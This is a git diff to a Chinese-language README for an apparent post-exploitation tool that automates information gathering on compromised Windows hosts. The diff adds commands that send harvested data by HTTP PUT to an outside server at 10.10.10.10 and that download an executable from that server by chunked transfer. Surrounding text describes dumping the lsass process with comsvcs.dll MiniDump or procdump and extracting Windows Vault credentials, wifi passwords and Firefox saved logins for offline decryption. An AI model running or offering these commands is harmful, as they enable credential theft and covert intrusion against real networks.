@@ -2,7 +2,7 @@
 
 ​	 每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量，既为了能更好的获取内网进一步突破点攻击面,这段闲暇时间造了个简易的轮子，其在真实环境中发现较多未知问题，欢迎大家踊跃提交 issue 和 PR ！
 
-#### v1.0-开发进度：
+#### 开发进度：
 
 #### 简介
 
@@ -24,7 +24,7 @@ win2008测试环境：
 
 ###### cmd.exe
 
-存储于本地文件夹：
+存储于本地临时文件夹：
 
 ```
 python exploit.py
@@ -34,6 +34,18 @@ python exploit.py
 
 ```
 python exploit.py -t ftp_host -u ftp_user -p ftp_pwd
+```
+
+通过PUT请求回传http服务端
+
+```
+python exploit.py -d http://10.10.10.10:8000/ 
+```
+
+HTTP分块传输落地可执行文件 
+
+```
+python http_client.py -d http://10.10.10.10./exploit.exe -u http://10.10.10.10:8000/ 
 ```
 
 ###### 一、基础信息获取：
@@ -61,7 +73,7 @@ python exploit.py -t ftp_host -u ftp_user -p ftp_pwd
 
 2、使用comsvcs.dll 中MiniDump 函数 dump指定lsass进程,
 
-如失败则使用procdump提取lsa缓存进程，回传ftp，半自动化离线解密  
+如失败则使用procdump提取lsa缓存进程，回传ftp或http服务端，半自动化离线解密  
 
 3、通过netsh 导出系统 wifi密码[暂时删除]、Windows Vaults 普通 / WEB 凭据提取
 
@@ -121,4 +133,5 @@ fiefox浏览器解密基于key3.db、key4.db，logins.json文件，密钥加密�
 ## 已知故障和错误列表
 
 - 系统容错问题，增加部分功能异常处理，提高稳定性。
-- 部分内网ftp协议传输限制,后期准备修改为http传输。
+- 部分内网ftp协议传输限制,后期添加HTTP PUT传输。
+- pyinstaller打包后的可执行文件较大，建议在纯净环境下打包可执行文件更小
